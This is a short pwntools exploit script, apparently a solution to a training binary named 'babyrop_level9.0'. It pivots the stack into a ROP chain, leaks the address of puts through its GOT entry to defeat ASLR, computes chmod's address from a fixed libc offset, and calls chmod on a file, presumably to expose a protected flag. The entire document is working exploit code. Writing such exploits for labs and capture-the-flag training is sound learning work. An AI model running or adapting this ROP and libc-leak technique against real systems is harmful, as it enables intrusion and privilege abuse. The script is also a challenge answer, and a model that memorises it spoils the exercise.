from pwn import *

p = process("./babyrop_level9.0")

payload = b""
payload += p64(0x4014b4) # pop rsp ; pop r13 ; pop rbp ; ret
payload += p64(0x4140e0+16) # 8 bytes (+16 to start from 3rd gadget)
payload += p64(0x0) # 8 bytes into r13
payload += p64(0x0) # 8 bytes into rbp
payload += p64(0x401c33) # pop rdi ; ret (to setup puts@plt(puts@got))
payload += p64(0x404028) # puts@got
payload += p64(0x401120) # puts@plt
payload += p64(0x4011d0) # go to _start()

p.sendline(payload)

print(p.recvuntil(b"Leaving!\n"))

puts_leak_addr = p.recvline().split(b'\n')[0][::-1]
puts_addr = int.from_bytes(puts_leak_addr)
print("[+] PUTS() ADDR LEAK :: " + hex(puts_addr))

offset_relative_puts_chmod = 0x7f160
chmod_addr = puts_addr + offset_relative_puts_chmod

payload = b""
payload += p64(0x4014b4) # pop rsp ; pop r13 ; pop rbp ; ret
payload += p64(0x4140e0+16) # 8 bytes (+16 to start from 3rd gadget)
payload += p64(0x0) # 8 bytes into r13
payload += p64(0x0) # 8 bytes into rbp

payload += p64(0x401c33) # pop rdi ; ret (to setup chmod)
payload += p64(0x4027eb) # filename* to '!' character
payload += p64(0x401c31) # pop rsi ; pop r15 ; ret (to setup chmod)
payload += p64(0x4) # mode = 4
payload += p64(0x0) # pop into r15
payload += p64(chmod_addr) # go to challenge()

p.sendline(payload)

print(p.recvall())